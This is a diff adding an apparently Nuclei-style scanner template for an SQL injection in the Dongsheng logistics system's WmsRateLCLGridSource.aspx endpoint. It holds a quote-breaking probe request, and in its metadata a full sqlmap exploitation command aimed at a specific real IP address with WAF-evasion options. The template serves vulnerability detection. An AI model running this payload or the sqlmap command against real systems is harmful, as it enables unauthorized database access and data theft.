@@ -1,0 +1,31 @@
+id: dongshengsoft-WmsRateLCLGridSource-sqli
+info:
+  name: 东胜物流软件 WmsRateLCLGridSource.aspx SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 WmsRateLCLGridSource.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/mzecw9w7fygepp50
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips: if waf pls --risk/--level
+    sqlmap: sqlmap -u "http://115.29.108.236:8007/SeaiInfoLCL/WmsRateLCLGridSource.aspx?handle=getiswmsin&gids=1" --tamper=space2comment --random-agent -p gids --dbms=mssql --batch
+    repair:
+    version:
+  tags: dongshengsoft,sqli
+
+http:
+  - raw:
+      - |
+        GET /SeaiInfoLCL/WmsRateLCLGridSource.aspx?handle=getiswmsin&gids=1,2') HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'SqlException','DONGSHENG')
+        condition: and
